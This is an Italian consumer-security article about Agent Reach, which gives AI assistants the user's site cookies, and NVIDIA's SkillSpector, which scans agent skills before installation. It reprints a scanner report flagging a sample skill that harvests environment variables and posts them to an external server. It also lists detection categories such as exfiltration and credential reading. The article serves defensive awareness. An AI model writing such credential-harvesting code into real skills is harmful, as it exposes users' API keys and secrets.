---
title: "Quello che installi nell'assistente AI può vedere i tuoi account"
description: "Agent Reach fa leggere agli assistenti AI X, Reddit e YouTube usando i tuoi login; SkillSpector di NVIDIA controlla una skill prima che tu la installi. Due progetti di tendenza su GitHub, lo stesso problema."
date: 2026-10-27
category: sicurezza
forBusiness: true
perTe:
  - "Agent Reach, la prima volta che usa un sito, copia nel suo browser il login che hai già in Chrome: per quel sito, non per gli altri."
  - "Il progetto stesso consiglia di collegare un account secondario, perché le piattaforme possono limitare gli account usati in automatico."
  - "SkillSpector di NVIDIA legge una skill senza eseguirla e dà un punteggio da 0 a 100, ma non protegge da quello che installi lo stesso."
perAzienda:
  - "Prima di dare una skill a un assistente in azienda, qualcuno deve leggerla o farla passare da uno scanner come SkillSpector."
  - "Un assistente che usa i login dei dipendenti agisce con il loro nome: per l'automazione servono account dedicati."
  - "Con l'analisi AI attiva, SkillSpector manda il contenuto della skill al fornitore del modello scelto; con --no-llm resta tutto sul computer."
sources:
  - title: "GitHub, NVIDIA/SkillSpector"
    url: https://github.com/NVIDIA/SkillSpector
    note: "il codice e le istruzioni dello scanner"
  - title: "NVIDIA: Scan agent skills before installation"
    url: https://docs.nvidia.com/skills/scanning-agent-skills
    note: "la guida ufficiale NVIDIA"
  - title: "Help Net Security: SkillSpector, lo scanner open source di NVIDIA"
    url: https://www.helpnetsecurity.com/2026/08/03/skillspector-open-source-agent-skill-security-scanner/
    note: "articolo di presentazione dello strumento"
  - title: "GitHub, Panniantong/Agent-Reach"
    url: https://github.com/Panniantong/Agent-Reach
    note: "il progetto, con l'elenco delle piattaforme"
  - title: "Agent Reach: README in inglese"
    url: https://github.com/Panniantong/Agent-Reach/blob/main/docs/README_en.md
    note: "la presentazione in inglese"
  - title: "Agent Reach: sessioni e browser dedicato"
    url: https://github.com/Panniantong/Agent-Reach/blob/main/agent_reach/skill/references/sessions.md
    note: "come copia i login dal tuo Chrome"
  - title: "Anthropic: Agent Skills, considerazioni di sicurezza"
    url: https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview
    note: "documentazione ufficiale sulle skill"
---
In questi giorni due progetti girano molto su GitHub. Agent Reach, con oltre ==104.000 stelle==, fa leggere agli assistenti AI pagine che da soli non raggiungono. SkillSpector di NVIDIA, con circa ==22.500 stelle==, controlla una skill prima che tu la installi.

Fanno cose diverse, ma insieme raccontano bene un fatto: ==quello che aggiungi a un assistente AI lavora con i tuoi permessi==, a volte anche con i tuoi account.

## Agent Reach: l'assistente legge con il tuo login

Assistenti come Claude Code o Codex sanno già cercare sul web e aprire una pagina. Non arrivano però a quello che sta ==dietro un login==: i post di un account su X, una ricerca su Reddit, i dettagli di un annuncio su LinkedIn.

Agent Reach installa gli strumenti che servono per arrivarci. Copre anche i sottotitoli di YouTube e Bilibili e alcune piattaforme cinesi come Xiaohongshu e Xueqiu. Si installa ==mandando all'assistente una frase con un link== alle istruzioni: il resto lo fa l'assistente.

Per i siti con login il progetto usa ==un browser suo==, separato dal Chrome che usi tutti i giorni e senza finestre. La prima volta che serve un sito, se Chrome ha l'estensione OpenCLI collegata, copia in quel browser ==i cookie di quel sito soltanto==.

Il README dice che non copia gli altri siti né le password salvate e che non modifica il tuo Chrome. Dichiara anche altre cose:

- lo strumento ==legge e basta==: non pubblica, non commenta, non manda messaggi;
- non fa login al posto tuo e ==non chiede mai la password==;
- il browser dedicato accetta connessioni ==solo dal tuo computer==;
- tutto quello che installa sta in una cartella, `~/.agent-reach/`, e un comando di logout cancella il login di un sito.

<style>.dg { width: 100%; height: auto; display: block; border-radius: 14px; border: 1px solid var(--line); } .dg-paper { fill: var(--surface); } .dg-line { fill: none; stroke: var(--muted); stroke-width: 1.5; } .dg-line-a { fill: none; stroke: var(--accent); stroke-width: 2; } .dg-dash { stroke-dasharray: 5 4; } .dg-mk { fill: var(--muted); } .dg-mk-a { fill: var(--accent); } .dg-lab { font: 500 12px var(--mono); letter-spacing: 0.08em; fill: var(--muted); } .dg-lab-a { font: 600 12px var(--mono); letter-spacing: 0.08em; fill: var(--accent); } .dg-node { fill: var(--surface); stroke: var(--muted); } .dg-chip-a { fill: var(--accent-soft); stroke: var(--accent); } .dg-name { font: 600 16px var(--text); fill: var(--fg); } .dg-sub { font: 400 12px var(--mono); fill: var(--muted); } .dg-tag, .dg-tag-a { font: 600 11px var(--mono); letter-spacing: 0.12em; fill: var(--muted); } .dg-tag-a { fill: var(--accent); } .dg-narrow { max-width: 480px; margin-inline: auto; }</style>
<figure class="figure">
<svg class="dg dg-narrow" viewBox="0 0 440 396" xmlns="http://www.w3.org/2000/svg" role="img" aria-labelledby="ar-title ar-desc">
<title id="ar-title">Come Agent Reach usa i tuoi login</title>
<desc id="ar-desc">Dal Chrome di tutti i giorni Agent Reach copia una volta i cookie del solo sito che serve nel suo browser dedicato; da lì l'assistente AI legge il sito come se fossi tu.</desc>
<defs>
<marker id="ar-arrow" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" class="dg-mk"/></marker>
<marker id="ar-arrow-a" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" class="dg-mk-a"/></marker>
</defs>
<rect width="440" height="396" class="dg-paper"/>
<line x1="120" y1="104" x2="120" y2="150" class="dg-line-a" marker-end="url(#ar-arrow-a)"/>
<line x1="120" y1="246" x2="120" y2="292" class="dg-line" marker-end="url(#ar-arrow)"/>
<rect x="132" y="115" width="264" height="24" class="dg-paper"/>
<text x="140" y="132" class="dg-lab-a">COPIA I COOKIE DI UN SOLO SITO</text>
<rect x="132" y="257" width="168" height="24" class="dg-paper"/>
<text x="140" y="274" class="dg-lab">LEGGE, NON PUBBLICA</text>
<rect x="24" y="24" width="392" height="80" rx="6" class="dg-node"/>
<text x="40" y="46" class="dg-tag">IL TUO COMPUTER</text>
<text x="40" y="70" class="dg-name">Chrome di tutti i giorni</text>
<text x="40" y="92" class="dg-sub">password e altri siti restano dove sono</text>
<rect x="24" y="150" width="392" height="96" rx="6" class="dg-chip-a"/>
<text x="40" y="172" class="dg-tag-a">AGENT REACH</text>
<text x="40" y="196" class="dg-name">Browser dedicato, senza finestre</text>
<text x="40" y="218" class="dg-sub">raggiungibile solo da questo computer</text>
<text x="40" y="236" class="dg-sub">tutto salvato in ~/.agent-reach/</text>
<rect x="24" y="292" width="392" height="80" rx="6" class="dg-node"/>
<text x="40" y="314" class="dg-tag">ASSISTENTE AI</text>
<text x="40" y="338" class="dg-name">Claude Code, Codex e simili</text>
<text x="40" y="360" class="dg-sub">entra nel sito con il tuo account</text>
</svg>
<figcaption>Schema basato sul <a href="https://github.com/Panniantong/Agent-Reach/blob/main/docs/README_en.md" rel="noopener">README di Agent Reach</a> e sulla sua <a href="https://github.com/Panniantong/Agent-Reach/blob/main/agent_reach/skill/references/sessions.md" rel="noopener">pagina sulle sessioni</a></figcaption>
</figure>

Poi c'è il consiglio più utile. Il login copiato ==di solito è il tuo account principale==, e le piattaforme possono limitare gli account usati per l'automazione. Il progetto suggerisce di passare a ==un account secondario==.

> [!PUNTO]
> Agent Reach spiega apertamente come usa i tuoi login. Proprio per questo vale la pena leggerlo: l'assistente entra nei siti come se fossi tu.

C'è anche un avviso che dice molto. Su PyPI esiste un pacchetto che si chiama `agent-reach` e ==non è questo progetto==: il README chiede di non installarlo e di usare il link alle istruzioni su GitHub.

Un nome quasi uguale basta a installare il programma sbagliato. È il problema che SkillSpector prova a intercettare.

## SkillSpector: un controllo prima di installare

Una skill è una cartella con un file di istruzioni, `SKILL.md`, e spesso degli script che l'assistente esegue. NVIDIA scrive che le skill per Claude Code, Codex CLI e Gemini CLI ==partono con una fiducia implicita== e quasi nessun controllo.

Il README cita uno studio del 2026 su 31.132 skill prese dai marketplace principali. Il ==26,1%== ha almeno una vulnerabilità, il ==5,2%== mostra intenti probabilmente malevoli. Le skill con script eseguibili hanno ==2,12 volte più probabilità== di essere vulnerabili.

SkillSpector risponde a una domanda: ==posso installare questa skill?== Prende una cartella, un singolo file, un archivio zip o un repository GitHub e lo passa in due fasi.

1. Un'analisi ==statica e veloce==, senza mai eseguire la skill. Cerca una settantina di schemi in 17 categorie: istruzioni nascoste, comandi per mandare dati all'esterno, lettura di chiavi e password, codice offuscato, script scaricati da Internet ed eseguiti al volo.
2. Un'analisi ==con un modello AI==, facoltativa, che legge il contesto e confronta quello che la skill dichiara con quello che il codice fa davvero.

Controlla anche le librerie che la skill usa, cercandole nel database pubblico di vulnerabilità OSV.dev. Alla fine dà ==un punteggio da 0 a 100== e un consiglio: sicura, attenzione, non installare.

L'esempio nel README è una skill che ==raccoglie le variabili d'ambiente==, dove spesso stanno le chiavi API, e le spedisce a un server esterno. SkillSpector segnala le due righe di codice e le collega: insieme vogliono dire furto di credenziali.

<style>.term { margin: 0; padding: 18px 20px; background: #0b1020; color: #cbd5e1; border: 1px solid var(--line); border-radius: 14px; font: 500 13px/1.55 var(--mono); overflow-x: auto; white-space: pre; } .term b { color: #f8fafc; font-weight: 600; } .term .t-bad { color: #ff7a7a; font-weight: 600; } .term .t-dim { color: #7c8aa5; } @media (max-width: 480px) { .term { font-size: 10.5px; padding: 14px; } }</style>
<figure class="figure">
<pre class="term" aria-label="Esempio di report di SkillSpector"><b> SkillSpector Security Report  v2.0.0</b>
&#8203;
Skill: suspicious-skill
Source: ./suspicious-skill/
&#8203;
        Risk Assessment
 Score           <span class="t-bad">78/100</span>
 Severity        <span class="t-bad">HIGH</span>
 Recommendation  <span class="t-bad">DO NOT INSTALL</span>
&#8203;
        Components (3)
 File              Type      Lines  Executable
 SKILL.md          markdown    142  No
 scripts/sync.py   python       87  Yes
 requirements.txt  text          3  No
&#8203;
Issues (2)
&#8203;
  <span class="t-bad">HIGH: Env Variable Harvesting (E2)</span>
    Location: scripts/sync.py:23
    Finding: for key, val in os.environ.items():...
    <span class="t-dim">Confidence: 94%</span>
&#8203;
  <span class="t-bad">HIGH: External Transmission (E1)</span>
    Location: scripts/sync.py:45
    Finding: requests.post("https://api.skill.io/env"...
    <span class="t-dim">Confidence: 89%</span></pre>
<figcaption>Esempio dalla <a href="https://github.com/NVIDIA/SkillSpector#example-output" rel="noopener">documentazione di SkillSpector</a>, accorciato: una skill finta che legge le variabili d'ambiente e le manda fuori. Punteggio 78 su 100, consiglio: non installare.</figcaption>
</figure>

La documentazione di NVIDIA aggiunge l'obiettivo finale: lo scopo dichiarato, i permessi, il codice e i rischi documentati della skill ==devono dire la stessa cosa==.

### Cosa non fa

NVIDIA lo scrive chiaro: SkillSpector è ==una difesa in più, non una gabbia==.

- Segnala i rischi prima dell'installazione. Se installi la skill lo stesso, ==non la isola e non la blocca==.
- Non esegue la skill, quindi ==non vede cosa fa mentre gira==.
- Può perdere istruzioni scritte ==in lingue diverse dall'inglese==, e non legge il testo dentro le immagini né il codice compilato o cifrato.
- La prima fase trova quasi tutto ma ==dà anche falsi allarmi==.

Due dettagli contano per la privacy. Con l'analisi AI attiva, che è l'impostazione predefinita, ==il contenuto dei file va al fornitore del modello== che hai configurato. Con l'opzione `--no-llm` resta tutto sul computer.

Il controllo delle librerie invece manda sempre a OSV.dev ==i nomi e le versioni dei pacchetti==, non il codice.

> [!ATTENZIONE]
> SkillSpector è uno strumento da riga di comando: richiede Python 3.12 o Docker. Per chi non apre mai il terminale, il primo controllo resta leggere la skill, script compresi.

## Due facce dello stesso problema

Messi uno accanto all'altro, i due progetti mostrano ==dove passa il rischio==.

Agent Reach è uno strumento dichiarato, che spiega cosa copia e come toglierlo. Una skill malevola fa le stesse cose ==senza dirlo==: legge un token, lo manda fuori, e tu vedi solo un assistente che ha finito il lavoro.

In tutti e due i casi il punto debole è lo stesso: ==l'assistente agisce con i permessi che gli hai dato tu==. I file del tuo computer, le chiavi nelle variabili d'ambiente, i login dei siti.

<figure class="figure">
<svg class="dg dg-narrow" viewBox="0 0 440 500" xmlns="http://www.w3.org/2000/svg" role="img" aria-labelledby="sk-title sk-desc">
<title id="sk-title">Dove si mette il controllo di SkillSpector</title>
<desc id="sk-desc">Una skill presa da GitHub passa da SkillSpector prima dell'installazione. Una volta installata gira con i permessi dell'assistente e può toccare file e chiavi, login dei siti e rete verso l'esterno, dove SkillSpector non controlla più.</desc>
<defs>
<marker id="sk-arrow" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" class="dg-mk"/></marker>
<marker id="sk-arrow-a" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" class="dg-mk-a"/></marker>
</defs>
<rect width="440" height="500" class="dg-paper"/>
<line x1="120" y1="104" x2="120" y2="150" class="dg-line-a" marker-end="url(#sk-arrow-a)"/>
<line x1="120" y1="230" x2="120" y2="276" class="dg-line" marker-end="url(#sk-arrow)"/>
<line x1="220" y1="356" x2="84" y2="388" class="dg-line" marker-end="url(#sk-arrow)"/>
<line x1="220" y1="356" x2="220" y2="388" class="dg-line" marker-end="url(#sk-arrow)"/>
<line x1="220" y1="356" x2="356" y2="388" class="dg-line" marker-end="url(#sk-arrow)"/>
<rect x="132" y="115" width="216" height="24" class="dg-paper"/>
<text x="140" y="132" class="dg-lab-a">PRIMA DI INSTALLARE</text>
<rect x="132" y="241" width="96" height="24" class="dg-paper"/>
<text x="140" y="258" class="dg-lab">INSTALLI</text>
<rect x="24" y="24" width="392" height="80" rx="6" class="dg-node"/>
<text x="40" y="46" class="dg-tag">GITHUB · MARKETPLACE</text>
<text x="40" y="70" class="dg-name">Skill da installare</text>
<text x="40" y="92" class="dg-sub">SKILL.md, script, librerie</text>
<rect x="24" y="150" width="392" height="80" rx="6" class="dg-chip-a"/>
<text x="40" y="172" class="dg-tag-a">SKILLSPECTOR</text>
<text x="40" y="196" class="dg-name">Legge la skill senza eseguirla</text>
<text x="40" y="218" class="dg-sub">punteggio da 0 a 100 e un consiglio</text>
<rect x="24" y="276" width="392" height="80" rx="6" class="dg-node"/>
<text x="40" y="298" class="dg-tag">ASSISTENTE AI</text>
<text x="40" y="322" class="dg-name">La skill gira con i tuoi permessi</text>
<text x="40" y="344" class="dg-sub">come qualsiasi programma sul computer</text>
<rect x="24" y="394" width="120" height="64" rx="6" class="dg-node"/>
<text x="36" y="420" class="dg-name">File</text>
<text x="36" y="442" class="dg-sub">e chiavi API</text>
<rect x="160" y="394" width="120" height="64" rx="6" class="dg-node"/>
<text x="172" y="420" class="dg-name">Login</text>
<text x="172" y="442" class="dg-sub">dei tuoi siti</text>
<rect x="296" y="394" width="120" height="64" rx="6" class="dg-node"/>
<text x="308" y="420" class="dg-name">Rete</text>
<text x="308" y="442" class="dg-sub">invio di dati</text>
<line x1="24" y1="476" x2="416" y2="476" class="dg-line dg-dash"/>
<rect x="104" y="466" width="232" height="20" class="dg-paper"/>
<text x="220" y="481" text-anchor="middle" class="dg-lab">QUI SKILLSPECTOR NON ARRIVA</text>
</svg>
<figcaption>Schema basato sulla <a href="https://github.com/NVIDIA/SkillSpector#trust-model-and-data-egress" rel="noopener">documentazione di SkillSpector</a>: lo strumento controlla prima dell'installazione e non isola la skill dopo.</figcaption>
</figure>

Anthropic lo scrive nella documentazione delle Agent Skills: vanno usate ==solo da fonti fidate== e lette per intero prima di installarle, come si fa con un programma.

> [!PUNTO] Il riepilogo
> - Una skill o uno strumento per l'assistente lavorano con i tuoi permessi, e a volte con i tuoi login.
> - Agent Reach dichiara come usa i cookie e consiglia un account secondario: è un consiglio da seguire.
> - SkillSpector controlla una skill prima di installarla, ma non sostituisce la lettura e non protegge dopo.

## Cosa conviene fare

> [!REGOLE]
> 1. **Leggi prima di installare.** Apri il `SKILL.md` e gli script. Se non capisci cosa fa uno script, non installare la skill.
> 2. **Fai passare la skill da SkillSpector.** Se usi il terminale, `skillspector scan` seguito dalla cartella o dal link GitHub. Con `--no-llm` il codice non esce dal computer.
> 3. **Installa dal link ufficiale.** Usa il repository indicato dal progetto, non un pacchetto con un nome simile trovato su PyPI o npm.
> 4. **Usa un account secondario.** Se uno strumento usa i tuoi login per far leggere l'assistente, collegagli un account creato apposta, non quello principale.
> 5. **Tieni lontane le chiavi.** Le chiavi API non vanno incollate in chat né lasciate in file che l'assistente legge.
> 6. **Togli quello che non usi più.** Logout dal browser dedicato e disinstallazione dello strumento, così i cookie copiati spariscono.
